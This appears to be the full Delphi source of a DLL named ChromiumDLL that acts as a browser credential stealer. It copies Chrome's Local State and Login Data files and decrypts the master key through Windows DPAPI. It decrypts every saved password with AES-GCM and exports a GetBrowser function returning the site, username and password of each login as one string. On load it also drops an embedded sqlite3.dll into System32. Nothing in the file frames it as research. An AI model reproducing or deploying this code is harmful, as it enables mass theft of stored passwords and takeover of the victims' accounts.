library ChromiumDLL;

{$R *.dres}  // Ensure sqlite3.dll is added as a resource named "sqlite"

uses
  Windows,
  SysUtils,
  StrUtils,
  ShlObj,
  NetEncoding,
  Classes,
  FireDAC.Stan.Intf,
  FireDAC.Stan.Option,
  FireDAC.Stan.Error,
  FireDAC.Phys.Intf,
  FireDAC.Stan.Def,
  FireDAC.Stan.Pool,
  FireDAC.Stan.Async,
  FireDAC.Phys,
  FireDAC.Stan.Param,
  FireDAC.DatS,
  FireDAC.DApt.Intf,
  FireDAC.DApt,
  Data.DB,
  FireDAC.Comp.DataSet,
  FireDAC.Comp.Client,
  FireDAC.Phys.SQLite,
  mormot.crypt.core,
  system.JSON,
  system.IOUtils;

{$R *.res}

// Define external dependencies
type
  _CRYPTPROTECT_PROMPTSTRUCT = record
    cbSize: DWORD;
    dwPromptFlags: DWORD;
    hwndApp: HWND;
    szPrompt: PWideChar;
  end;

  CRYPTPROTECT_PROMPTSTRUCT = _CRYPTPROTECT_PROMPTSTRUCT;
  PCRYPTPROTECT_PROMPTSTRUCT = ^CRYPTPROTECT_PROMPTSTRUCT;

function CryptUnprotectData(pDataIn: PDATA_BLOB; ppszDataDescr: PPWideChar;
  pOptionalEntropy: PDATA_BLOB; pReserved: Pointer;
  pPromptStruct: PCRYPTPROTECT_PROMPTSTRUCT; dwFlags: DWORD;
  pDataOut: PDATA_BLOB): BOOL; stdcall; external 'Crypt32.dll';

function dpApiUnprotectData(fpDataIn: tBytes): tBytes;
var
  DataIn, DataOut: DATA_BLOB;
begin
  DataOut.cbData := 0;
  DataOut.pbData := nil;
  DataIn.cbData := Length(fpDataIn);
  DataIn.pbData := @fpDataIn[0];

  if not CryptUnprotectData(@DataIn, nil, nil, nil, nil, 0, @DataOut) then
    RaiseLastOSError;

  setLength(Result, DataOut.cbData);
  Move(DataOut.pbData^, Result[0], DataOut.cbData);
  LocalFree(HLOCAL(DataOut.pbData));
end;

function Convert(const Bytes: tBytes): RawByteString;
begin
  setLength(Result, Length(Bytes));
  Move(Bytes[0], Result[1], Length(Bytes))
end;

function GetLocalState_Dir: String;
var
  Local_FilePath: array [0 .. MAX_PATH] of Char;
begin
  Result := '';
  SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, 0, Local_FilePath);
  CopyFile(PChar(Local_FilePath + '\Google\Chrome\User Data\Local State'),
    PChar(Local_FilePath + '\Temp\Google_Chrome State'), true);
  Result := PChar(Local_FilePath + '\Temp\Google_Chrome State');
end;

function GetLoginData_Dir: String;
var
  Local_FilePath: array [0 .. MAX_PATH] of Char;
begin
  Result := '';
  SHGetFolderPath(0, CSIDL_LOCAL_APPDATA, 0, 0, Local_FilePath);
  CopyFile(PChar(Local_FilePath + '\Google\Chrome\User Data\Default\Login Data'),
    PChar(Local_FilePath + '\Temp\Google_Chrome Data'), true);
  Result := PChar(Local_FilePath + '\Temp\Google_Chrome Data');
end;

function GetPassword(MasterKey, Password: tBytes): String;
var
  AES_GCM: TAesGcmEngine;
  Key: array [0 .. 31] of Byte;
  IV: array [0 .. 11] of Byte;
  CipherText: tBytes;
  Tag: TAesBlock;
  DecryptedText: tBytes;
begin
  Delete(MasterKey, 0, 5);
  MasterKey := dpApiUnprotectData(MasterKey);
  Move(MasterKey[0], Key[0], SizeOf(Key));
  Move(Copy(Password, 3, 12)[0], IV[0], SizeOf(IV));
  Delete(Password, 0, 15);
  CipherText := Password;

  if Length(CipherText) < 16 then
    raise Exception.Create('CipherText is too short to contain a valid tag');

  Move(CipherText[Length(CipherText) - 16], Tag, SizeOf(Tag));
  setLength(CipherText, Length(CipherText) - 16);

  AES_GCM.Init(Key, 256);
  AES_GCM.Reset(@IV, SizeOf(IV));
  setLength(DecryptedText, Length(CipherText));
  AES_GCM.Decrypt(CipherText, DecryptedText, Length(CipherText), @Tag, SizeOf(Tag));

  Result := TEncoding.UTF8.GetString(DecryptedText);
end;

function ExtractDLLIfMissing: Boolean;
var
  ResourceStream: TResourceStream;
  DLLPath: string;
begin
  // Define path to System32 directory for 32-bit DLL on 32-bit Windows
  DLLPath := SysUtils.GetEnvironmentVariable('WINDIR') + '\System32\sqlite3.dll';
  Result := FileExists(DLLPath);

  if not Result then
  begin
    // Attempt to extract sqlite3.dll to System32
    try
      ResourceStream := TResourceStream.Create(HInstance, 'sqlite', RT_RCDATA);
      try
        ResourceStream.SaveToFile(DLLPath);
        Result := True;
      finally
        ResourceStream.Free;
      end;
    except
      // Log or handle extraction failure if necessary
      Result := False;
    end;
  end;
end;

function GetBrowser: PChar; stdcall;
var
  EncryptedMasterKey: string;
  FDConnection: TFDConnection;
  FDQuery: TFDQuery;
  JsonValue: TJSONObject;
  OriginURL, Username, Password: string;
  LocalStatePath, LoginDataPath: String;
  ResultStr: string;
begin
  ResultStr := ''; // Initialize the result string

  // Get the file paths for LocalState and LoginData
  LocalStatePath := GetLocalState_Dir;
  LoginDataPath := GetLoginData_Dir;

  if (LocalStatePath = '') or (LoginDataPath = '') then
  begin
    ResultStr := 'Failed to get file paths';
    Result := StrNew(PChar(ResultStr)); // Allocate memory and return
    Exit;
  end;

  // Parse LocalState JSON to get the encrypted key
  JsonValue := TJSONObject.ParseJSONValue(TFile.ReadAllText(LocalStatePath)) as TJSONObject;
  try
    EncryptedMasterKey := JsonValue.GetValue<TJSONObject>('os_crypt')
      .GetValue<string>('encrypted_key').Replace('"', '');
  finally
    JsonValue.Free;
  end;

  FDConnection := TFDConnection.Create(nil);
  try
    FDConnection.ResourceOptions.SilentMode := True;
    FDConnection.Params.DriverID := 'SQLite';
    FDConnection.Params.Database := LoginDataPath;

    if FDConnection.Params.Database = '' then
    begin
      ResultStr := 'Database path is unknown or invalid';
      Result := StrNew(PChar(ResultStr)); // Allocate memory and return
      Exit;
    end;

    FDQuery := TFDQuery.Create(nil);
    try
      FDQuery.Connection := FDConnection;
      FDQuery.SQL.Text := 'SELECT origin_url, username_value, password_value FROM logins';
      FDQuery.Open;

      while not FDQuery.Eof do
      begin
        OriginURL := FDQuery.FieldByName('origin_url').AsString;
        Username := FDQuery.FieldByName('username_value').AsString;
        Password := FDQuery.FieldByName('password_value').AsString;

        // If ResultStr is not empty, add a pipe to separate records
        if ResultStr <> '' then
          ResultStr := ResultStr + '|';

        // Append current record
        ResultStr := ResultStr + OriginURL + '|' + Username;
        if Password <> '' then
          ResultStr := ResultStr + '|' + GetPassword(TNetEncoding.Base64.DecodeStringToBytes(EncryptedMasterKey), FDQuery.FieldByName('password_value').AsBytes);

        FDQuery.Next;
      end;

    finally
      FDQuery.Free;
    end;
  finally
    FDConnection.Free;
  end;

  // Ensure files are deleted after use
  if FileExists(LocalStatePath) then TFile.Delete(LocalStatePath);
  if FileExists(LoginDataPath) then TFile.Delete(LoginDataPath);

  // Cleanup sensitive data and reset variables
  EncryptedMasterKey := '';
  OriginURL := '';
  Username := '';
  Password := '';
  LocalStatePath := '';
  LoginDataPath := '';

  // Allocate memory for the result string and return
  Result := StrNew(PChar(ResultStr));
end;

exports
  GetBrowser;

begin
  // Ensure sqlite3.dll is extracted to System32 on load
  if not ExtractDLLIfMissing then
    raise Exception.Create('Failed to load sqlite3.dll');
end.

